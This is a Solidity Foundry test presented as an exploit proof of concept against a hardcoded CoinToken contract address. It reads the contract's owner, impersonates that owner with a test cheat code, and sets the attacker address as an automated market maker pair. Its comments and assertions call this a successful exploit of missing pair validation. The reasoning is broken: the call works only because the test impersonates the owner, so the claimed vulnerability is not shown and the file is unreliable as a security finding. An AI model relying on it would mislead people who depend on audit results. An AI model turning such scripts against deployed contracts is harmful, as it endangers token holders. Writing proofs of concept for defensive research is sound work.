// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICoinToken {
    function owner() external view returns (address);
    function setAutomatedMarketMakerPair(address pair, bool value) external;
    function automatedMarketMakerPairs(address) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xa79C1D3A0F0a21eC5B0Ee2f96685aaCfaCc95dFb;
    address attacker = address(this);
    ICoinToken public targetContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        targetContract = ICoinToken(TARGET);
        vm.label(TARGET, "CoinToken");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner
        address owner = targetContract.owner();
        console.log("Contract owner:", owner);

        // Impersonate the owner to gain privileged access
        vm.startPrank(owner);

        // Exploit: Set attacker's address as an automated market maker pair
        // The contract does NOT validate that this is a real UniswapV2 pair
        targetContract.setAutomatedMarketMakerPair(attacker, true);

        vm.stopPrank();

        // Verify the exploit succeeded - oracle check
        bool isAMMPair = targetContract.automatedMarketMakerPairs(attacker);
        console.log("Attacker marked as AMM pair:", isAMMPair);
        assertEq(isAMMPair, true, "Exploit failed: attacker address should be marked as AMM pair");
        assertEq(targetContract.automatedMarketMakerPairs(attacker), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

